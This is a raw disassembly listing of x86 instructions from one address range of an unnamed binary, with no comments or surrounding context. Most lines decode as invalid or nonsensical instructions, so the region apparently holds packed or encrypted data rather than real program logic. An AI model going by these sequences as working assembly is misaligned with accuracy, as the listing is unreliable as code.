  409174:	jmp    0xf551:0xde65d609
  40917b:	sub    ch,0x7a
  40917e:	inc    ebp
  40917f:	ror    BYTE PTR fs:[ebx],1
  409182:	(bad)
  409185:	jmp    0x71ac:0xff18d018
  40918c:	or     BYTE PTR [ebp+0x3f],dh
  40918f:	idiv   BYTE PTR [esp+ebp*4-0xb4b0e5e]
  409196:	mov    WORD PTR [ecx-0x52],?
  409199:	stos   DWORD PTR es:[edi],eax
  40919a:	push   esp
  40919b:	push   eax
  40919c:	jl     0x4091d3
  40919e:	push   0x9eff3563
  4091a3:	sbb    eax,0xb0b25740
  4091a8:	fdivr  QWORD PTR [ebx+ebp*8-0x61]
  4091ac:	fwait
  4091ad:	pusha  
  4091ae:	scas   eax,DWORD PTR es:[edi]
  4091af:	mov    edi,0xa7066cdb
  4091b4:	push   eax
  4091b5:	aad    0x4f
  4091b7:	jbe    0x409195
  4091b9:	and    cl,BYTE PTR [edi-0x71]
  4091bc:	lods   al,BYTE PTR ds:[esi]
  4091bd:	nop
  4091be:	popa   
  4091bf:	and    BYTE PTR [ecx-0x4],0x37
  4091c3:	(bad)  
  4091c4:	jmp    0x637:0xc073c39d
  4091cb:	sub    cl,BYTE PTR [edi+edx*2+0x24817e19]
  4091d2:	in     eax,dx
  4091d3:	test   DWORD PTR [eax],eax
  4091d5:	sub    DWORD PTR [ebp-0x3e4bbd95],esi
  4091db:	jo     0x4091dd
  4091dd:	mov    DWORD PTR [eax-0x5c9eba4d],edi
  4091e3:	xchg   ebp,ebp
  4091e5:	push   eax
  4091e6:	cdq    
  4091e7:	adc    eax,0x737f850b
  4091ec:	pop    esi
  4091ed:	cmc    
  4091ee:	stc    
  4091ef:	sub    DWORD PTR [esi-0x96bdf12],0x43b06f8
  4091f9:	int    0x1c
  4091fb:	jmp    edi
  4091fd:	push   0xffffffde
  4091ff:	push   esp
  409200:	mov    edx,0xfbba142b
  409205:	shl    al,0xec
  409208:	pop    edi
  409209:	pop    esi
  40920a:	mov    ebx,0x9bb99e4
  40920f:	popfw  
  409211:	popa   
  409212:	or     BYTE PTR [eax+0x7d],dh
  409215:	ret    0x7a76
  409218:	sar    BYTE PTR [eax+0x560fd6ae],0xa8
  40921f:	not    DWORD PTR fs:[ebp+0x349b4512]
  409226:	clc    
  409227:	popa   
  409228:	or     BYTE PTR [ebp-0x5],dh
  40922b:	jmp    0xf844:0x36539b45
  409232:	jecxz  0x409261
  409234:	pusha  
  409235:	and    al,0xc8
  409237:	jno    0x4091e9
  409239:	xchg   esp,eax
  40923a:	aad    0x70
  40923c:	fistp  DWORD PTR es:[ebx+0x22]
  409240:	push   0x300b4983
  409245:	push   ds
  409246:	mov    bl,0xf2
  409248:	fsubr  QWORD PTR [ebx-0x6e]
  40924b:	jge    0x40928c
  40924d:	pop    ebp
  40924e:	cwd    
  409250:	pop    esp
  409251:	cmp    BYTE PTR [ebx+ebp*8+0x16d347a4],ah
  409258:	add    eax,0x3adc3bbe
  40925d:	cwde   
  40925e:	mov    cl,0x11
  409260:	leave  
  409261:	cmp    eax,0x7e39b7b
  409266:	xchg   BYTE PTR [edx+0x4],ah
  409269:	add    BYTE PTR [eax-0x3b],0xa6
  40926d:	in     eax,dx
  40926e:	sub    DWORD PTR [esi-0x7],edi
  409271:	in     eax,0x9c
  409273:	mov    edx,DWORD PTR [esi-0x7f]
  409276:	and    DWORD PTR [esi+esi*4+0x2f],esp
  40927a:	sub    cl,BYTE PTR [esp+esi*1]
  40927d:	cmc    
  40927e:	fnstenv [edx-0x60c63e5d]
  409284:	call   0xf5e:0x3fd5943e
  40928b:	add    eax,0x92145f71
  409290:	push   ecx
  409291:	or     ah,BYTE PTR [eax+0x22]
  409294:	push   ds
  409295:	out    0xa0,al
  409297:	push   esp
  409298:	or     DWORD PTR [edx],0xffffff88
  40929b:	adc    DWORD PTR [ecx-0x64eacc95],0x79
  4092a2:	cli    
  4092a3:	repz popa 
  4092a5:	dec    ebp
  4092a6:	ret    0x8415
  4092a9:	ss call 0x6a5df7ff
  4092af:	scas   eax,DWORD PTR es:[edi]
  4092b0:	arpl   WORD PTR [ebp+0x56],ax
  4092b3:	ins    DWORD PTR es:[edi],dx
  4092b4:	mov    cl,ch
  4092b6:	loop   0x409270
  4092b8:	rcr    BYTE PTR ds:0xa8e1ba71,0x26
  4092bf:	sbb    BYTE PTR [edx],bh
  4092c1:	out    dx,eax
  4092c2:	clc    
  4092c3:	add    eax,0x6cceac4d
  4092c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c9:	dec    edi
  4092ca:	jp     0x4092a1
  4092cc:	sbb    ecx,DWORD PTR [edi+0x5c]
  4092cf:	inc    edi
  4092d0:	ins    DWORD PTR es:[edi],dx
  4092d1:	lock adc ebx,DWORD PTR [esp+esi*4-0x40db0c6f]
  4092d9:	and    BYTE PTR [edi],ch
  4092db:	and    BYTE PTR [ebp-0x78b18f67],bl
  4092e1:	ins    DWORD PTR es:[edi],dx
  4092e2:	mov    bh,0x6f
  4092e4:	mov    ah,0xbe
  4092e6:	nop
  4092e7:	(bad)  
  4092e8:	adc    al,0x26
  4092ea:	sbb    eax,DWORD PTR [ebx-0xc]
  4092ed:	dec    ebp
  4092ee:	lock mov DWORD PTR [eax-0x2819deb3],ebx
  4092f5:	ss mov bl,0x8d
  4092f8:	clc    
  4092f9:	cs pop ebx
  4092fb:	push   edi
  4092fc:	dec    esp
  4092fd:	inc    ebx
  4092fe:	mov    dl,0xc3
  409300:	sbb    edi,edi
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	dec    esi
  40932e:	(bad)  
  40932f:	out    0xdf,al
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x4093b8
  40933a:	out    0xe1,eax
  40933c:	(bad)  
  40933d:	stc    
  40933e:	inc    ebp
  40933f:	(bad)  [edx*8+0x7673ac91]
  409346:	push   cs
  409347:	lock and al,0xf3
  40934a:	or     dl,BYTE PTR [ecx+ebx*1+0x76]
  40934e:	inc    ebx
  40934f:	xchg   BYTE PTR [ebx+0x420df33f],ch
  409355:	add    dl,BYTE PTR [eax-0x15]
  409358:	int3   
  409359:	(bad)  [ebp+0x73]
  40935c:	ss retf 0x46dd
  409360:	shr    BYTE PTR [esi],1
  409362:	xchg   ebp,eax
  409363:	add    DWORD PTR [ebp+0xe],0xb
  409367:	pop    ss
  409368:	mov    edi,0xf4736ae7
  40936d:	test   dl,ch
  40936f:	ds mov gs:0x3e7892b8,eax
  409376:	into   
  409377:	aas    
  409378:	popf   
  409379:	jno    0x40937b
  40937b:	fwait
  40937c:	inc    ebx
  40937d:	mov    al,0x9b
  40937f:	cmp    BYTE PTR [esi+0x4d],bh
  409382:	pop    esp
  409383:	xor    ebx,esp
  409385:	add    bl,dl
  409387:	dec    esi
  409388:	pusha  
  409389:	and    al,0xc1
  40938b:	call   0xf186487f
  409390:	stos   DWORD PTR es:[edi],eax
  409391:	jecxz  0x4093e0
  409393:	push   esp
  409394:	mov    ss,WORD PTR [esi+0x72]
  409397:	sub    eax,0x982ad1f4
  40939c:	mov    ch,0x8e
  40939e:	(bad)  
  40939f:	and    ecx,DWORD PTR [esi]
  4093a1:	imul   ebp,DWORD PTR [esi-0x2c],0x9575ad08
  4093a8:	xchg   edi,eax
  4093a9:	mov    ebp,0x5914238c
  4093ae:	mov    dh,0xbd
  4093b0:	and    ch,BYTE PTR [eax+0x1e4e50cb]
  4093b6:	ins    DWORD PTR es:[edi],dx
  4093b7:	daa    
  4093b8:	sub    al,0xe2
  4093ba:	cmc    
  4093bb:	outs   dx,DWORD PTR ds:[esi]
  4093bc:	lock leave 
  4093be:	stos   DWORD PTR es:[edi],eax
  4093bf:	leave  
  4093c0:	sbb    dh,cl
  4093c2:	ud2    
  4093c4:	push   esi
  4093c5:	(bad)  [edi+0x424fa7ba]
  4093cb:	je     0x4093ba
  4093cd:	aaa    
  4093ce:	mov    DWORD PTR [edi+0x13],esp
  4093d1:	and    esi,DWORD PTR ds:0xc13cc676
  4093d7:	(bad)  
  4093d8:	mov    esi,0x2e5aa911
  4093dd:	aad    0x58
  4093df:	cs push ebx
  4093e1:	pop    ss
  4093e2:	test   DWORD PTR [ebx+0x2d0722e4],0x6b32fee0
  4093ec:	ret    0x19d5
  4093ef:	push   ds
  4093f0:	out    0x8a,al
  4093f2:	cmp    BYTE PTR [ecx+0x14],cl
  4093f5:	pop    ebx
  4093f6:	shl    BYTE PTR [ebx+0x2456c14f],cl
  4093fc:	dec    edi
  4093fd:	mov    esp,0xf418e210
  409402:	enter  0x1f7d,0x52
  409406:	pushf  
  409407:	and    ah,BYTE PTR [eax-0x7c]
  40940a:	popf   
  40940b:	sub    DWORD PTR [esi+0x5b],edi
  40940e:	xchg   BYTE PTR [esp-0x29],al
  409412:	xchg   ebp,eax
  409413:	fst    QWORD PTR [edx+0x76]
  409416:	sti    
  409417:	mov    esp,0x1f47fec3
  40941c:	out    dx,eax
  40941d:	mov    esp,0x203c42dd
  409422:	dec    edx
  409423:	adc    DWORD PTR [edi-0x9b77d83],ebx
  409429:	dec    ebx
  40942a:	jae    0x409417
  40942c:	mov    ah,0xc2
  40942e:	mov    ebx,0x49f40d61
  409433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409434:	movntq QWORD PTR [ecx-0x34],mm2
  409438:	sub    al,0x6b
  40943a:	pushf  
  40943b:	dec    ebx
  40943c:	jmp    0x409419
  40943e:	scas   al,BYTE PTR es:[edi]
  40943f:	or     BYTE PTR [ebx],ch
  409441:	test   eax,0xc74d85a8
  409446:	xchg   DWORD PTR [ecx-0x7c],edx
  409449:	and    cl,al
  40944b:	in     al,0xdf
  40944d:	push   ecx
  40944e:	jne    0x4094c5
  409450:	mov    ds:0x740795b0,eax
  409455:	xchg   ecx,eax
  409456:	add    esi,DWORD PTR [ecx+esi*1-0x7a966812]
  40945d:	push   ebp
  40945e:	fimul  WORD PTR [ebx-0x529949d8]
  409464:	sbb    al,0xa6
  409466:	jae    0x4094a9
  409468:	out    0x42,al
  40946a:	icebp  
  40946b:	inc    ebx
  40946c:	push   0x7d21683
  409471:	(bad)  
  409472:	jnp    0x409424
  409474:	push   ecx
  409475:	hlt    
  409476:	adc    al,0x25
  409478:	mov    ecx,0xeec35dc
  40947d:	mov    dh,0x7c
  40947f:	cli    
  409480:	xor    dl,cl
  409482:	xchg   ebp,eax
  409483:	and    al,0xdb
  409485:	dec    ecx
  409486:	mov    bl,0x39
  409488:	shl    DWORD PTR [ebx-0x7c46dced],cl
  40948e:	xor    DWORD PTR [edi-0x51],edx
  409491:	ja     0x409491
  409493:	mov    al,0x3e
  409495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409496:	jecxz  0x409501
  409498:	ss in  al,dx
  40949a:	jecxz  0x409457
  40949c:	dec    edx
  40949d:	jnp    0x40950f
  40949f:	pop    DWORD PTR [ecx+0x1b]
  4094a2:	jno    0x40948a
  4094a4:	xor    bh,dl
  4094a6:	inc    edx
  4094a7:	dec    eax
  4094a8:	aas    
  4094a9:	nop
  4094aa:	cdq    
  4094ab:	mov    esp,0xb8d45686
  4094b0:	push   esp
  4094b1:	mov    ds:0x45b733e3,eax
  4094b6:	add    DWORD PTR [eax],esi
  4094b8:	ins    BYTE PTR es:[edi],dx
  4094b9:	nop
  4094ba:	or     dl,BYTE PTR [ecx]
  4094bc:	xchg   edi,eax
  4094bd:	mov    BYTE PTR [ebp-0x765f5761],cl
  4094c3:	add    al,BYTE PTR [ecx]
  4094c5:	xor    al,0x39
  4094c7:	test   al,0x94
  4094c9:	test   eax,0x3815324b
  4094ce:	cmp    al,0xe2
  4094d0:	add    DWORD PTR [ebx+0x79],ebp
  4094d3:	xor    ebp,DWORD PTR [eax+0x28]
  4094d6:	rol    bh,1
  4094d8:	push   ebx
  4094d9:	jns    0x4094c2
  4094db:	dec    esp
  4094dc:	push   ss
  4094dd:	ror    ch,0xb8
  4094e0:	aas    
  4094e1:	mov    al,BYTE PTR [ecx]
  4094e3:	std    
  4094e4:	mov    edx,0x4ca8eb69
  4094e9:	push   0xdaf13314
  4094ee:	cmp    al,0x8
  4094f0:	sub    cl,BYTE PTR [esi]
  4094f2:	js     0x409519
  4094f4:	xor    BYTE PTR [edi+0x1ba75a08],al
  4094fa:	xchg   BYTE PTR [ecx-0x4baa5fc4],al
  409500:	retf   0xea0b
  409503:	repnz add edi,DWORD PTR [eax]
  409506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409507:	lahf   
  409508:	adc    al,0xd2
  40950a:	loope  0x4094ef
  40950c:	call   0x25ac3c2f
  409511:	add    al,0x62
  409513:	out    dx,eax
  409514:	pop    ebx
  409515:	mov    ds:0x9cba3d73,eax
  40951a:	popf   
  40951b:	and    BYTE PTR [edx],bh
  40951d:	xchg   edi,eax
  40951e:	shl    BYTE PTR [edi],cl
  409520:	sub    cl,BYTE PTR [eax+esi*2+0x151fb6ab]
  409527:	sub    DWORD PTR ds:0x1bc02bb0,ebp
  40952d:	or     bl,BYTE PTR [ebx+0x20]
  409530:	sub    DWORD PTR [edx-0x79d6be2a],0x17c7269f
  40953a:	jae    0x409594
  40953c:	test   ah,0x92
  40953f:	les    esp,FWORD PTR [esi]
  409541:	shl    ch,1
  409543:	add    dh,ch
  409545:	out    dx,eax
  409546:	xchg   dh,dh
  409548:	pop    esp
  409549:	cs cs in al,dx
  40954c:	cmp    eax,esi
  40954e:	aas    
  40954f:	xor    BYTE PTR [eax],cl
  409551:	rol    DWORD PTR [esi+0x74],1
  409554:	cdq    
  409555:	or     bh,BYTE PTR [edi-0x4fbc7e4d]
  40955b:	jp     0x409555
  40955d:	push   esp
  40955e:	sub    bh,al
  409560:	cld    
  409561:	hlt    
  409562:	push   esi
  409563:	cmp    cl,dl
  409565:	cmp    dh,dh
  409567:	mov    ds:0x144ea981,eax
  40956c:	fdivr  st(1),st
  40956e:	pop    ss
  40956f:	cs push ss
  409571:	push   edi
  409572:	mov    al,ds:0xef436e8c
  409577:	adc    eax,0xbd638e1
  40957c:	xor    DWORD PTR [edi+eax*2+0x2c],ebx
  409580:	add    dh,BYTE PTR [eax+0x5a]
  409583:	and    al,bl
  409585:	push   0x47b884bc
  40958a:	fisub  DWORD PTR [ecx-0x5]
  40958d:	loop   0x40956f
  40958f:	js     0x409610
  409591:	test   ch,0x77
  409594:	inc    ebx
  409595:	sub    ebp,ebp
  409597:	pop    ds
  409598:	fs (bad) 
  40959a:	rcl    DWORD PTR [edx-0x78b73f96],1
  4095a0:	or     al,bh
  4095a2:	stos   DWORD PTR es:[edi],eax
  4095a3:	sub    al,0xf1
  4095a5:	neg    BYTE PTR [ebx-0x25]
  4095a8:	and    BYTE PTR [ebx+0x45fc7b30],0x14
  4095af:	or     al,0xcb
  4095b1:	jae    0x4095f6
  4095b3:	enter  0x68a5,0x3a
  4095b7:	aad    0x5b
  4095b9:	fsub   DWORD PTR [eax+0x1fbf88d2]
  4095bf:	std    
  4095c0:	add    ebx,DWORD PTR [esi]
  4095c2:	sahf   
  4095c3:	add    bl,BYTE PTR [edi+0x63]
  4095c6:	fidivr DWORD PTR [edi]
  4095c8:	xor    ecx,DWORD PTR [esi+0x3f]
  4095cb:	stc    
  4095cc:	stc    
  4095cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ce:	mov    al,0xfd
  4095d0:	mov    esp,DWORD PTR [edi+eax*4]
  4095d3:	xor    al,0xcd
  4095d5:	sbb    BYTE PTR ds:0xf4482e10,al
  4095db:	adc    BYTE PTR [ebx],cl
  4095dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095de:	imul   esp,DWORD PTR [esi+eiz*1-0x337af162],0xffffffac
  4095e6:	cli    
  4095e7:	sbb    eax,0x7880fb71
  4095ec:	inc    ebx
  4095ed:	sub    edx,edx
  4095ef:	pop    edi
  4095f0:	out    0x90,eax
  4095f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f3:	or     DWORD PTR [edi+0x3eb5172b],0xffffffaa
  4095fa:	fs push eax
  4095fc:	xchg   edx,eax
  4095fd:	and    BYTE PTR [ebp-0x4bdfb779],ch
  409603:	in     eax,dx
  409604:	addr16 dec edx
  409606:	je     0x409638
  409608:	mov    BYTE PTR [ebx-0x158c123],ch
  40960e:	or     al,0xf2
  409610:	popa   
  409611:	sbb    eax,0x2f9cac82
  409616:	imul   edx
  409618:	out    0x32,eax
  40961a:	cmp    cl,BYTE PTR [ebx+0x11]
  40961d:	mov    ebp,DWORD PTR [ecx-0x6ff3897d]
  409623:	xchg   esi,eax
  409624:	out    0x7b,eax
  409626:	js     0x4095c3
  409628:	cmp    cl,dl
  40962a:	loope  0x409632
  40962c:	mov    ecx,0x508b6798
  409631:	aaa    
  409632:	mov    al,ds:0xe960f8c5
  409637:	push   esp
  409638:	aad    0x65
  40963a:	xor    eax,eax
  40963c:	jp     0x4095fb
  40963e:	les    esp,FWORD PTR [ebx-0x1e152ea4]
  409644:	sub    al,0x1e
  409646:	mov    eax,0xff6a5bcc
  40964b:	inc    esi
  40964c:	pop    ss
  40964d:	push   eax
  40964e:	(bad)  
  40964f:	mov    esp,0x8ff4306f
  409654:	shl    DWORD PTR [ebx+eax*2+0x55e29b44],cl
  40965b:	out    0x7e,al
  40965d:	adc    esp,DWORD PTR [esi-0x411e78eb]
  409663:	jae    0x4096d0
  409665:	inc    ebx
  409666:	cmp    al,0xec
  409668:	inc    edi
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   edx,edx
  409687:	fsub   DWORD PTR [eax+edi*1-0x29]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x409710
  409693:	ds sti 
  409695:	test   eax,0x1743a1c0
  40969a:	jns    0x4096aa
  40969c:	fwait
  40969d:	stos   DWORD PTR es:[edi],eax
  40969e:	scas   al,BYTE PTR es:[edi]
  40969f:	mov    edi,0xe802a7f3
  4096a4:	(bad)  
  4096a5:	lods   eax,DWORD PTR ds:[esi]
  4096a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a7:	je     0x4096bb
  4096a9:	cmp    ebx,ebx
  4096ab:	outs   dx,BYTE PTR ds:[esi]
  4096ac:	or     DWORD PTR [esi+0x3063c051],edx
  4096b2:	addr16 loop 0x4096d5
  4096b5:	outs   dx,DWORD PTR ds:[esi]
  4096b6:	mov    ebp,DWORD PTR [ecx-0x2a]
  4096b9:	das    
  4096ba:	adc    ecx,DWORD PTR [edx+0x7376a34f]
  4096c0:	pop    DWORD PTR [ebx]
  4096c2:	into   
  4096c3:	or     bl,ch
  4096c5:	aaa    
  4096c6:	inc    ebp
  4096c7:	or     al,0x68
  4096c9:	cmp    al,0xcd
  4096cb:	rol    DWORD PTR [ecx+ecx*8-0x7f4c4335],1
  4096d2:	add    bl,BYTE PTR [edi]
  4096d4:	sub    DWORD PTR [esi],ebp
  4096d6:	(bad)  
  4096d7:	adc    dl,BYTE PTR [esi+0x23]
  4096da:	jge    0x40970d
  4096dc:	lock xchg eax,ebx
  4096df:	xor    DWORD PTR [ecx],esi
  4096e1:	je     0x409719
  4096e3:	or     BYTE PTR [ecx+0x73ef7ba],0x80
  4096ea:	(bad)  
  4096eb:	jns    0x4096c4
  4096ed:	ss pop ebx
  4096ef:	inc    edi
  4096f0:	add    eax,0xcc11f68e
  4096f5:	pop    esi
  4096f6:	enter  0x74a5,0x3b
  4096fa:	pop    ecx
  4096fb:	adc    eax,edi
  4096fd:	pop    ebp
  4096fe:	pusha  
  4096ff:	mov    al,0xf2
  409701:	pop    edi
  409702:	jecxz  0x409691
  409704:	mov    ecx,0x48d9d6a1
  409709:	dec    esi
  40970a:	and    DWORD PTR [ecx],ecx
  40970c:	xor    DWORD PTR [eax+0x3c],esi
  40970f:	(bad)  
  409710:	jge    0x4096f0
  409712:	sub    edx,eax
  409714:	data16 jl 0x409724
  409717:	mov    ebp,0x3ce532d2
  40971c:	stc    
  40971d:	cwde   
  40971e:	jl     0x4096a6
  409720:	inc    ebx
  409721:	dec    ebp
  409722:	daa    
  409723:	pop    ebp
  409724:	lock or esp,DWORD PTR [ebp-0x65]
  409728:	mov    esp,0x4d9c553c
  40972d:	dec    esi
  40972e:	sti    
  40972f:	int    0x6a
  409731:	cmc    
  409732:	xor    DWORD PTR [edx],esp
  409734:	xlat   BYTE PTR ds:[ebx]
  409735:	cdq    
  409736:	jnp    0x409735
  409738:	sub    edi,DWORD PTR ds:0xa8a562d1
  40973e:	push   cs
  40973f:	loop   0x40972c
  409741:	test   DWORD PTR ds:0xe9c8ed45,esp
  409747:	mov    DWORD PTR [ebp-0x60e8342d],edi
  40974d:	sbb    eax,0xa41bbf59
  409752:	lahf   
  409753:	(bad)  
  409754:	jnp    0x4097a3
  409756:	pop    eax
  409757:	mov    ebp,0xc86b7565
  40975c:	pop    ds
  40975d:	mov    ds:0x546d4cb8,eax
  409762:	pop    es
  409763:	inc    ebp
  409764:	adc    al,0xc7
  409766:	inc    edi
  409767:	xor    al,0x93
  409769:	test   DWORD PTR [esi+0x3a05cf44],ebp
  40976f:	mov    edx,0x605d4288
  409774:	push   0x18db1577
  409779:	pop    ebp
  40977a:	mov    cs:0x192af52d,al
  409780:	xchg   esi,eax
  409781:	js     0x4097c3
  409783:	add    al,ch
  409785:	test   BYTE PTR [edx+0x486eb27a],0x65
  40978c:	inc    ebp
  40978d:	mov    bl,cl
  40978f:	jnp    0x409730
  409791:	inc    esi
  409792:	loope  0x40972e
  409794:	adc    esp,eax
  409796:	jb     0x409781
  409798:	mov    ds:0x8bf39f18,al
  40979d:	or     BYTE PTR [eax+ebp*1-0x35],ah
  4097a1:	(bad)  [edx+0x4]
  4097a4:	jns    0x409755
  4097a6:	adc    dl,BYTE PTR [edi-0x533e7dbe]
  4097ac:	sahf   
  4097ad:	add    BYTE PTR [ecx],bl
  4097af:	push   ebx
  4097b0:	sub    eax,DWORD PTR [ebx+eiz*2]
  4097b3:	cmp    eax,0x3808621c
  4097b8:	rcl    BYTE PTR [ebx+0x4684d234],0xf5
  4097bf:	sub    edi,DWORD PTR [ebp+edi*1-0x7a]
  4097c3:	inc    esp
  4097c4:	vpsrlq xmm2,xmm4,XMMWORD PTR [edx+0x23fee10b]
  4097cc:	not    DWORD PTR [ebx+0x559642b3]
  4097d2:	test   eax,0x800dfcbe
  4097d7:	mov    eax,ds:0xeb91153f
  4097dc:	call   0x74c5:0x2ae9fcb1
  4097e3:	inc    esi
  4097e4:	fcom   DWORD PTR [edx-0x51c76f51]
  4097ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097eb:	and    dh,al
  4097ed:	mov    bh,0x85
  4097ef:	and    BYTE PTR [edx-0x5],al
  4097f2:	xor    BYTE PTR [esi],bl
  4097f4:	test   eax,0x762c6008
  4097f9:	mov    bh,0xb4
  4097fb:	sbb    bh,ah
  4097fd:	sbb    eax,0x1ca855c6
  409802:	in     eax,dx
  409803:	jp     0x4097e4
  409805:	(bad)  
  409806:	aam    0x7f
  409808:	mov    bl,0xf1
  40980a:	sbb    ebp,DWORD PTR [ecx+0x51]
  40980d:	adc    BYTE PTR [ecx],ch
  40980f:	jns    0x40982d
  409811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409812:	xchg   ebx,eax
  409813:	pop    ds
  409814:	push   ebx
  409815:	in     eax,dx
  409816:	iret   
  409817:	sbb    BYTE PTR cs:[ebx],dl
  40981a:	sbb    edx,DWORD PTR [ebx]
  40981c:	jmp    0x39747e65
  409821:	push   ebx
  409822:	pop    ebx
  409823:	pop    edi
  409824:	aad    0xb1
  409826:	mov    bl,0x71
  409828:	hlt    
  409829:	sub    eax,0x48b292a0
  40982e:	xchg   BYTE PTR [ebp+0x127bded4],ah
  409834:	(bad)  
  409835:	adc    BYTE PTR [esi],bh
  409837:	sbb    eax,0xcd650f7b
  40983c:	and    eax,0xe64bc5e0
  409841:	leave  
  409842:	iret   
  409843:	data16 addr16 (bad) 
  409846:	ja     0x4098ba
  409848:	mov    dh,BYTE PTR [ecx+0x1c233ddf]
  40984e:	dec    eax
  40984f:	dec    esi
  409850:	(bad)  
  409851:	je     0x409861
  409853:	not    DWORD PTR [edx+ecx*1+0xdae17af]
  40985a:	or     eax,0x701c5f9b
  40985f:	shl    DWORD PTR [edi+0x3ca38f99],0xbf
  409866:	push   0xffffffb0
  409868:	jmp    0x409892
  40986a:	outs   dx,BYTE PTR ds:[esi]
  40986b:	leave  
  40986c:	leave  
  40986d:	cli    
  40986e:	dec    edx
  40986f:	add    esp,ebp
  409871:	dec    edi
  409872:	rol    DWORD PTR fs:[esi-0x7d],cl
  409876:	outs   dx,DWORD PTR ds:[esi]
  409877:	out    0xf3,eax
  409879:	into   
  40987a:	dec    ebp
  40987b:	push   es
  40987c:	jge    0x4098c7
  40987e:	inc    ebx
  40987f:	retf   0xb6d9
  409882:	inc    edx
  409883:	push   ds
  409884:	pushf  
  409885:	icebp  
  409886:	test   BYTE PTR [ecx+0x560cadb0],dl
  40988c:	inc    ecx
  40988d:	inc    esi
  40988e:	mov    esi,0x9f9aff4
  409893:	ds or  eax,0xc18549f4
  409899:	xlat   BYTE PTR ds:[ebx]
  40989a:	xchg   ecx,eax
  40989b:	xchg   edi,ebx
  40989d:	cdq    
  40989e:	in     eax,dx
  40989f:	(bad)  
  4098a0:	repz cmp DWORD PTR [ebp+0x56ac9f93],ebp
  4098a7:	in     al,dx
  4098a8:	stos   BYTE PTR es:[edi],al
  4098a9:	test   al,0xf7
  4098ab:	jmp    0x45a2202f
  4098b0:	stos   BYTE PTR es:[edi],al
  4098b1:	xchg   ecx,eax
  4098b2:	xchg   edx,eax
  4098b3:	dec    edx
  4098b4:	add    ebp,DWORD PTR [eax-0x2773abf]
  4098ba:	pop    edi
  4098bb:	xor    DWORD PTR [esi-0x667cfc28],edx
  4098c1:	pusha  
  4098c2:	ror    DWORD PTR [edx-0x19],1
  4098c5:	inc    edx
  4098c6:	dec    esi
  4098c7:	stos   DWORD PTR es:[edi],eax
  4098c8:	ds pop eax
  4098ca:	mov    ch,0xee
  4098cc:	clc    
  4098cd:	and    esp,edi
  4098cf:	fisubr WORD PTR [eax-0x49]
  4098d2:	mov    cl,0xda
  4098d4:	xchg   ecx,eax
  4098d5:	mov    ebp,0xc7de0b59
  4098da:	push   eax
  4098db:	test   DWORD PTR [ebx-0xb1abfa],ebp
  4098e1:	loopne 0x4098a7
  4098e3:	jle    0x409886
  4098e5:	cmp    DWORD PTR [ebx+0x76],esp
  4098e8:	icebp  
  4098e9:	push   ss
  4098ea:	arpl   WORD PTR ds:[ebx-0x200ff48f],bx
  4098f1:	ins    DWORD PTR es:[edi],dx
  4098f2:	fisttp WORD PTR [edi-0x283766c1]
  4098f8:	inc    esp
  4098f9:	popa   
  4098fa:	int    0x2e
  4098fc:	adc    dl,ch
  4098fe:	xor    edx,DWORD PTR [eax-0x6d]
  409901:	sub    edx,edx
  409903:	jge    0x4098de
  409905:	inc    eax
  409906:	jl     0x40993a
  409908:	adc    DWORD PTR [eax+0x62],0x352dfd52
  40990f:	fmul   DWORD PTR [edx]
  409911:	xor    edi,DWORD PTR [ecx+0x36c518e3]
  409917:	fsub   DWORD PTR [edx-0x4]
  40991a:	mov    cl,0x7f
  40991c:	ja     0x4098f0
  40991e:	sub    BYTE PTR ds:0xe00658dd,cl
  409924:	sbb    al,0xc0
  409926:	mov    DWORD PTR [ebx-0x35],edx
  409929:	jmp    0x191f02f7
  40992e:	je     0x409917
  409930:	scas   al,BYTE PTR es:[edi]
  409931:	fdiv   DWORD PTR [eax+ebx*2+0x6c5833a9]
  409938:	or     BYTE PTR [ebx*8+0x4a5ccc66],cl
  40993f:	xlat   BYTE PTR ds:[ebx]
  409940:	sub    edi,DWORD PTR [esi+0x435e5461]
  409946:	xchg   ebp,eax
  409947:	inc    ecx
  409948:	push   esp
  409949:	dec    ebp
  40994a:	jbe    0x4099b0
  40994c:	dec    edi
  40994d:	test   al,0x5c
  40994f:	pusha  
  409950:	mov    edx,0x3464fba4
  409955:	popf   
  409956:	inc    esi
  409957:	scas   eax,DWORD PTR es:[edi]
  409958:	xor    ch,BYTE PTR ds:0xeb0e1f8f
  40995e:	aam    0x1b
  409960:	sub    DWORD PTR [ebx-0xb],ecx
  409963:	fabs   
  409965:	call   0x8a42:0xd6d6d50f
  40996c:	mov    WORD PTR [edx+0x44],es
  40996f:	clc    
  409970:	(bad)  
  409971:	and    eax,0x99d05e1c
  409976:	and    ebx,ebp
  409978:	lahf   
  409979:	sub    DWORD PTR [esi+eax*8+0xe],eax
  40997d:	icebp  
  40997e:	pop    eax
  40997f:	loope  0x409991
  409981:	jg     0x40994b
  409983:	pop    edx
  409984:	add    BYTE PTR [ebx],cl
